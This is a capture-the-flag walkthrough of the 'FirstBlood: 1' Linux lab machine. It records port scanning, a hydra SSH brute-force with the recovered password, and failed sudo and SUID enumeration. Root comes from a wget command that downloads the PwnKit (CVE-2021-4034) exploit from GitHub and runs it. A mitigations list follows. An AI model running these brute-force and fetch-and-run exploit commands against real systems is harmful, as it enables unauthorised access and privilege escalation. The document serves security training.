# FirstBlood: 1 — Walkthrough

| Field | Detail |
|---|---|
| Machine | FirstBlood: 1 |
| Series | FirstBlood |
| Author | iamv1nc3nt |
| Release Date | 19 September 2020 |
| OS | Linux |

## 🔍 Overview

FirstBlood: 1 is a Linux machine involving non-standard SSH port discovery, credential brute-forcing, and privilege escalation via a known CVE (PwnKit) after dead-end enumeration of SUID binaries and sudo misconfigurations.

---

## Step 1 – Reconnaissance

**Port Scanning**

```bash
nmap -sV -p- -A 192.168.1.6
```

**Result:** SSH running on a non-standard port — **60022**

---

## Step 2 – Credential Discovery

**Brute-forced SSH using a known username and wordlist:**

```bash
hydra -l johnny -P words.txt -v 192.168.1.6 ssh -s 60022 -t 4
```

**Credentials recovered:**

```
Username: johnny
Password: Vietnam
```

---

## Step 3 – Initial Access

```bash
ssh johnny@192.168.1.6 -p 60022
```

**Result:** Successfully logged in as `johnny`.

---

## Step 4 – Local Enumeration

```bash
id
whoami
uname -a
sudo -l
```

**Found sudo permission:**

```
(root) NOPASSWD: /usr/bin/esudo-properties
```

---

## Step 5 – Investigating `esudo-properties`

```bash
file /usr/bin/esudo-properties
cat /usr/bin/esudo-properties
ls -la /etc/esudo/
ls -la /etc/esudo/service
```

**Result:** Required config files were not writable by the current user — this path was a dead end.

---

## Step 6 – Additional Enumeration

```bash
cat /etc/passwd | grep -E "firstblood|johnny"
find / -user firstblood 2>/dev/null
find / -group firstblood 2>/dev/null
cat /etc/bodhibuilder.conf
ls -la /var/crash/
ls -la /home/firstblood/
cat ~/.bash_history
find / -writable -type d 2>/dev/null | grep -v proc
```

No additional escalation vectors found through these checks.

---

## Step 7 – SUID Enumeration

```bash
find / -perm -4000 -type f 2>/dev/null
find / -name "enlightenment_sys" 2>/dev/null
```

**Found:** `/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys`

---

## Step 8 – Investigating `enlightenment_sys`

```bash
strings /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
cat /etc/enlightenment/sysactions.conf
ls -la /etc/enlightenment/sysactions.conf
```

**Result:** Configuration contained a restrictive rule preventing exploitation via this binary — another dead end.

---

## Step 9 – Checking `pkexec`

```bash
pkexec --version
```

**Result:** Version `0.105` — vulnerable to **CVE-2021-4034 (PwnKit)**.

---

## Step 10 – Connectivity Check

```bash
which wget
ping -c 2 8.8.8.8
```

Confirmed outbound internet access to download the exploit.

---

## Step 11 – Privilege Escalation (PwnKit - CVE-2021-4034)

```bash
cd /tmp/x
wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -O PwnKit
chmod +x PwnKit
./PwnKit
```

**Result:** Root shell obtained successfully.

---

## Step 12 – Flag Capture

```bash
id
cat /root/flag.txt
find / -iname "*flag*" 2>/dev/null
```

✅ **Root flag captured — machine fully compromised.**

---

## 🛡️ Key Vulnerabilities Identified

1. Non-standard SSH port did not prevent brute-force enumeration
2. Weak SSH password, crackable via a targeted wordlist
3. Outdated `pkexec` version vulnerable to a known local privilege escalation CVE (PwnKit)

## 🩹 Mitigations

1. Enforce strong, non-dictionary passwords across all accounts
2. Implement account lockout / rate-limiting on SSH to slow brute-force attempts
3. Patch `pkexec` / `polkit` to a version unaffected by CVE-2021-4034
4. Regularly audit installed package versions against known CVEs
5. Restrict outbound internet access from production systems to limit exploit delivery

---

## 🧰 Tools Used

`nmap` · `hydra` · `ssh` · `PwnKit (CVE-2021-4034 exploit)`

## 🧠 Techniques Covered

Port scanning · SSH brute-forcing · Local enumeration · Sudo misconfiguration analysis · SUID binary analysis · Known-CVE privilege escalation (PwnKit)

---

## Summary

| Step | Description | Status |
|---|---|---|
| 1 | Reconnaissance | ✅ |
| 2 | Credential Discovery | ✅ |
| 3 | Initial Access | ✅ |
| 4 | Local Enumeration | ✅ |
| 5 | `esudo-properties` Investigation | ✅ |
| 6 | Additional Enumeration | ✅ |
| 7 | SUID Enumeration | ✅ |
| 8 | `enlightenment_sys` Investigation | ✅ |
| 9 | `pkexec` Version Check | ✅ |
| 10 | Connectivity Check | ✅ |
| 11 | Privilege Escalation (PwnKit) | ✅ |
| 12 | Flag Capture | ✅ |

*Writeup for educational purposes. Machine solved as part of the "FirstBlood" series.*
